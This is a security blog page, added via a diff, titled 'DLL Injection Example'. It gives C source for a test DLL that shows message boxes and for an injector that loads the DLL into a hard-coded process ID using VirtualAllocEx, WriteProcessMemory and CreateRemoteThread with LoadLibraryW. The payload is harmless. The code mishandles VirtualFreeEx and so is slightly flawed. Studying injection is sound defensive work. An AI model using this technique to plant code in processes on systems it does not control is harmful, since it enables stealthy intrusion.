@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>DLL Injection Example</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/bda28c76cf819b7e4937b62ff6f138ef.png" alt="2019-01-20-16-41-10"></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/34456eb264aeede6cd804d142421a1ee.png" alt="2019-01-20-16-41-18"></p>
+<p>Project1.dll:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+BOOL APIENTRY <span style="color:#a6e22e">DllMain</span>( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    <span style="color:#66d9ef">switch</span> (ul_reason_for_call)
+    {
+    <span style="color:#66d9ef">case</span> DLL_PROCESS_ATTACH:    
+        MessageBox(NULL, TEXT(<span style="color:#e6db74">&#34;DLL_PROCESS_ATTACH&#34;</span>), TEXT(<span style="color:#e6db74">&#34;成功了&#34;</span>), NULL);
+        <span style="color:#66d9ef">break</span>;
+    <span style="color:#66d9ef">case</span> DLL_THREAD_ATTACH:
+		MessageBox(NULL, TEXT(<span style="color:#e6db74">&#34;DLL_THREAD_ATTACH&#34;</span>), TEXT(<span style="color:#e6db74">&#34;成功了&#34;</span>), NULL);
+		<span style="color:#66d9ef">break</span>;
+    <span style="color:#66d9ef">case</span> DLL_THREAD_DETACH:
+		MessageBox(NULL, TEXT(<span style="color:#e6db74">&#34;DLL_THREAD_DETACH&#34;</span>), TEXT(<span style="color:#e6db74">&#34;成功了&#34;</span>), NULL);
+		<span style="color:#66d9ef">break</span>;
+    <span style="color:#66d9ef">case</span> DLL_PROCESS_DETACH:
+		MessageBox(NULL, TEXT(<span style="color:#e6db74">&#34;DLL_PROCESS_DETACH&#34;</span>), TEXT(<span style="color:#e6db74">&#34;成功了&#34;</span>), NULL);
+        <span style="color:#66d9ef">break</span>;
+    }
+    <span style="color:#66d9ef">return</span> TRUE;
+}
+
+</code></pre></div><p>Injection.exe:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">//根据进程ID获取进程句柄
+</span><span style="color:#75715e"></span>HANDLE <span style="color:#a6e22e">GetProcessHandle</span>(DWORD deProcessID)
+{
+    HANDLE hProcess <span style="color:#f92672">=</span> OpenProcess(
+        PROCESS_QUERY_INFORMATION  <span style="color:#75715e">//查询进程句柄
+</span><span style="color:#75715e"></span>        <span style="color:#f92672">|</span> PROCESS_VM_OPERATION     <span style="color:#75715e">//PROCESS_VM_WRITE + PROCESS_VM_READ + x 
+</span><span style="color:#75715e"></span>        <span style="color:#f92672">|</span> PROCESS_CREATE_THREAD    <span style="color:#75715e">//创建线程
+</span><span style="color:#75715e"></span>        <span style="color:#f92672">|</span> PROCESS_VM_WRITE,        <span style="color:#75715e">//WriteProcessMemory
+</span><span style="color:#75715e"></span>        FALSE,                     <span style="color:#75715e">//不继承
+</span><span style="color:#75715e"></span>        deProcessID                <span style="color:#75715e">//进程句柄
+</span><span style="color:#75715e"></span>        ); 
+
+    <span style="color:#66d9ef">return</span> hProcess;
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, TCHAR <span style="color:#f92672">*</span> argv[])
+{
+    DWORD dwErrCode <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+
+	<span style="color:#75715e">// 进程PID
+</span><span style="color:#75715e"></span>    DWORD dwProcessID <span style="color:#f92672">=</span> <span style="color:#ae81ff">1712</span>;
+    
+    HANDLE hDestProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessID);
+    <span style="color:#66d9ef">if</span>(NULL <span style="color:#f92672">==</span> hDestProcess) 
+    {
+        printf(<span style="color:#e6db74">&#34;open process error </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+
+
+    <span style="color:#75715e">//获取KERNER32.DLL 模块句柄
+</span><span style="color:#75715e"></span>    HMODULE hModule <span style="color:#f92672">=</span> GetModuleHandle(TEXT(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>)); 
+    <span style="color:#66d9ef">if</span>(NULL <span style="color:#f92672">==</span> hModule) 
+    {
+        printf(<span style="color:#e6db74">&#34;kernel32.dll </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+    }
+
+    <span style="color:#75715e">//线程函数，kernerl32.dll被映射到所有进程内相同的地址
+</span><span style="color:#75715e"></span>    LPTHREAD_START_ROUTINE lpThreadStartRoutine <span style="color:#f92672">=</span> 
+                         (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, <span style="color:#e6db74">&#34;LoadLibraryW&#34;</span>);
+
+    <span style="color:#66d9ef">if</span>(NULL <span style="color:#f92672">==</span> lpThreadStartRoutine) 
+    {
+		printf(<span style="color:#e6db74">&#34;LoadLibraryW Error </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+       
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>; 
+    }
+
+    <span style="color:#75715e">//从目标进程内申请堆内存
+</span><span style="color:#75715e"></span>    LPVOID lpMemory <span style="color:#f92672">=</span> VirtualAllocEx(
+                     hDestProcess, NULL, MAX_PATH, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_READWRITE);  
+    <span style="color:#66d9ef">if</span>(NULL <span style="color:#f92672">==</span> lpMemory) 
+    {
+		printf(<span style="color:#e6db74">&#34;VirtualAllocEx Error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
+    }
+
+    <span style="color:#75715e">//注入DLL
+</span><span style="color:#75715e"></span>    LPCTSTR lpDLLName <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Rvn0xsy</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Project1.dll&#34;</span>);
+
+    <span style="color:#75715e">//把DLL名字写入目标进程
+</span><span style="color:#75715e"></span>    BOOL bWriteMemory <span style="color:#f92672">=</span> WriteProcessMemory(
+        hDestProcess, lpMemory, lpDLLName, (lstrlenW(lpDLLName) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(lpDLLName[<span style="color:#ae81ff">0</span>]), NULL);
+	<span style="color:#75715e">//wprintf((LPWSTR)lpMemory);
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>(FALSE <span style="color:#f92672">==</span> bWriteMemory) 
+    {
+       
+		printf(<span style="color:#e6db74">&#34;WriteProcessMemory Error </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        dwErrCode <span style="color:#f92672">=</span> GetLastError();
+        VirtualFreeEx(hModule, lpMemory, <span style="color:#ae81ff">0</span>, MEM_RELEASE <span style="color:#f92672">|</span> MEM_DECOMMIT);
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
+    }
+ 
+
+    <span style="color:#75715e">//创建远程线程
+</span><span style="color:#75715e"></span>    HANDLE hThread <span style="color:#f92672">=</span> CreateRemoteThread(
+        hDestProcess, 
+        NULL,
+        <span style="color:#ae81ff">0</span>,
+        lpThreadStartRoutine,
+        lpMemory,
+        <span style="color:#ae81ff">0</span>,
+        NULL);
+    <span style="color:#66d9ef">if</span> (NULL <span style="color:#f92672">==</span> hThread <span style="color:#f92672">||</span> INVALID_HANDLE_VALUE <span style="color:#f92672">==</span> hThread)
+    {
+		printf(<span style="color:#e6db74">&#34;CreateRomoteThread Error %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,GetLastError());
+        VirtualFreeEx(hModule, lpMemory, <span style="color:#ae81ff">0</span>, MEM_RELEASE <span style="color:#f92672">|</span> MEM_DECOMMIT);
+        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">5</span>;
+    }
+
+
+
+    VirtualFreeEx(hModule, lpMemory, <span style="color:#ae81ff">0</span>, MEM_RELEASE <span style="color:#f92672">|</span> MEM_DECOMMIT);  
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+</code></pre></div><p>REF:https://www.cnblogs.com/HsinTsao/p/6528053.html</p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
